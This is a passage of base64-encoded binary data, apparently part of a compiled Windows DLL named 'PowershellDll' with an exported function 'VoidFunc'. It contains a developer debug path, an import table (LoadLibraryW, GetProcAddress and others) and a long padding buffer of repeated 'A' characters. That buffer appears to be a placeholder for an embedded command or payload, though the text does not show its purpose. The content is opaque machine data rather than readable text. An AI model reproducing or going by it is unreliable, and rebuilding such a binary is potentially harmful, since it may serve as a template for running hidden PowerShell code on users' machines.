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yCARAAAAAA/////wAAAAAMAAAACiQAEAAAAAD+////AAAAAND///8AAAAA/v///wAAAABNNQAQAAAAABI1ABAcNQAQ/v///wAAAACo////AAAAAP7///8AAAAAiisAEAAAAADfKgAQ6SoAEP7///8AAAAA2P///wAAAAD+////HDMAECAzABAAAAAA/v///wAAAADY////AAAAAP7////dKQAQ5ikAEEAAAAAAAAAAAAAAADEsABD/////AAAAAP////8AAAAAAAAAAAAAAAABAAAAAQAAAOwzARAiBZMZAgAAAPwzARABAAAADDQBEAAAAAAAAAAAAAAAAAEAAAAAAAAA/v///wAAAADQ////AAAAAP7///9DNAAQRzQAEAAAAABEKgAQAAAAAHQ0ARACAAAAgDQBEAQzARAAAAAAJIMBEAAAAAD/////AAAAAAwAAAARKgAQAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAFVNABAAAAAA5P///wAAAADU////AAAAAP7///8AAAAAr1AAEAAAAACXUAAQp1AAEP7///8AAAAA1P///wAAAAD+////AAAAADBXABAAAAAA/v///wAAAADU////AAAAAP7///8AAAAAgVcAEAAAAADk////AAAAANT///8AAAAA/v///4pcABCOXAAQAAAAAP7///8AAAAA2P///wAAAAD+////AAAAAHtgABAAAAAA/v///wAAAADY////AAAAAP7///8AAAAAh18AEAAAAAD+////AAAAANj///8AAAAA/v///wAAAADoXwAQAAAAAP7///8AAAAA2P///wAAAAD+////AAAAADNgABAAAAAA/v///wAAAADU////AAAAAP7///8AAAAAmHUAEAAAAAD+////AAAAANj///8AAAAA/v///wAAAABJcAAQAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAKt7ABAAAAAA5P///wAAAAC0////AAAAAP7///8AAAAAq38AEAAAAAD+////AAAAANT///8AAAAA/v///wAAAAD+fAAQAAAAAP7///8AAAAA2P///wAAAAD+////AAAAAKKDABAAAAAA/v///wAAAADU////AAAAAP7///8AAAAA/oYAEAAAAAD+////AAAAAMz///8AAAAA/v///wAAAAD/kwAQAAAAAP7///8AAAAAxP///wAAAAD+////AAAAACSXABAAAAAAAAAAAPeWABD+////AAAAAND///8AAAAA/v///wAAAAAAmAAQAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAHmbABAAAAAA/v///wAAAADM////AAAAAP7///8AAAAAa6IAEAAAAAD+////AAAAAND///8AAAAA/v///wAAAACfqAAQAAAAAP7///8AAAAA1P///wAAAAD+////AAAAACe1ABAAAAAA/v///wAAAADY////AAAAAP7///85xAAQTMQAEAAAAAAAAAAAxT2oWQAAAADiNwEAAQAAAAEAAAABAAAA2DcBANw3AQDgNwEAYBgAAPQ3AQAAAFBvd2Vyc2hlbGxEbGwuZGxsAFZvaWRGdW5jAAAAAFA4AQAAAAAAAAAAAOA5AQAA4AAAYDkBAAAAAAAAAAAA7jkBABDhAACMOQEAAAAAAAAAAAAIOgEAPOEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlDkBAKo5AQC6OQEAzDkBAIY+AQB2PgEAZj4BAFg+AQBEPgEAMj4BACI+AQAOPgEAAj4BABQ6AQAkOgEAOjoBAFA6AQBcOgEAeDoBAJY6AQCqOgEAvjoBANo6AQD0OgEACjsBACA7AQA6OwEAUDsBAGQ7AQB2OwEAhjsBAJI7AQCkOwEAvDsBAMw7AQDkOwEA/DsBABQ8AQA8PAEASDwBAFY8AQBkPAEAbjwBAHw8AQCOPAEAnDwBALI8AQC+PAEAyjwBANo8AQDmPAEA+jwBAAo9AQAcPQEAJj0BADI9AQA+PQEAUD0BAGI9AQB8PQEAlj0BAKg9AQC4PQEAxj0BANg9AQDkPQEA8j0BAAAAAAAaAACAEAAAgAgAAIAWAACABgAAgAIAAIAVAACADwAAgJsBAIAJAACAAAAAAPw5AQAAAAAAYgJHZXRNb2R1bGVGaWxlTmFtZUEAAKgDTG9hZExpYnJhcnlXAACdAkdldFByb2NBZGRyZXNzAABnAkdldE1vZHVsZUhhbmRsZVcAAEtFUk5FTDMyLmRsbAAAT0xFQVVUMzIuZGxsAABOAVN0clN0cklBAABTSExXQVBJLmRsbABQAkdldExhc3RFcnJvcgAA0QNNdWx0aUJ5dGVUb1dpZGVDaGFyAM0FV2lkZUNoYXJUb011bHRpQnl0ZQCyA0xvY2FsRnJlZQCCBVVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAAQwVTZXRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIACQJHZXRDdXJyZW50UHJvY2VzcwBhBVRlcm1pbmF0ZVByb2Nlc3MAAG0DSXNQcm9jZXNzb3JGZWF0dXJlUHJlc2VudAAtBFF1ZXJ5UGVyZm9ybWFuY2VDb3VudGVyAAoCR2V0Q3VycmVudFByb2Nlc3NJZAAOAkdldEN1cnJlbnRUaHJlYWRJZAAA1gJHZXRTeXN0ZW1UaW1lQXNGaWxlVGltZQBLA0luaXRpYWxpemVTTGlzdEhlYWQAZwNJc0RlYnVnZ2VyUHJlc2VudAC+AkdldFN0YXJ0dXBJbmZvVwAhAUVuY29kZVBvaW50ZXIArQRSdGxVbndpbmQAQARSYWlzZUV4Y2VwdGlvbgAAVANJbnRlcmxvY2tlZEZsdXNoU0xpc3QACwVTZXRMYXN0RXJyb3IAACUBRW50ZXJDcml0aWNhbFNlY3Rpb24AAKIDTGVhdmVDcml0aWNhbFNlY3Rpb24AAAUBRGVsZXRlQ3JpdGljYWxTZWN0aW9uAEgDSW5pdGlhbGl6ZUNyaXRpY2FsU2VjdGlvbkFuZFNwaW5Db3VudABzBVRsc0FsbG9jAAB1BVRsc0dldFZhbHVlAHYFVGxzU2V0VmFsdWUAdAVUbHNGcmVlAJ4BRnJlZUxpYnJhcnkApwNMb2FkTGlicmFyeUV4VwAAUQFFeGl0UHJvY2VzcwBmAkdldE1vZHVsZUhhbmRsZUV4VwAAMwNIZWFwRnJlZQAALwNIZWFwQWxsb2MAlgNMQ01hcFN0cmluZ1cAAGgBRmluZENsb3NlAG0BRmluZEZpcnN0RmlsZUV4QQAAfQFGaW5kTmV4dEZpbGVBAHIDSXNWYWxpZENvZGVQYWdlAKQBR2V0QUNQAACGAkdldE9FTUNQAACzAUdldENQSW5mbwDIAUdldENvbW1hbmRMaW5lQQDJAUdldENvbW1hbmRMaW5lVwAnAkdldEVudmlyb25tZW50U3RyaW5nc1cAAJ0BRnJlZUVudmlyb25tZW50U3RyaW5nc1cAogJHZXRQcm9jZXNzSGVhcAAAwAJHZXRTdGRIYW5kbGUAAD4CR2V0RmlsZVR5cGUAxQJHZXRTdHJpbm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EAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEA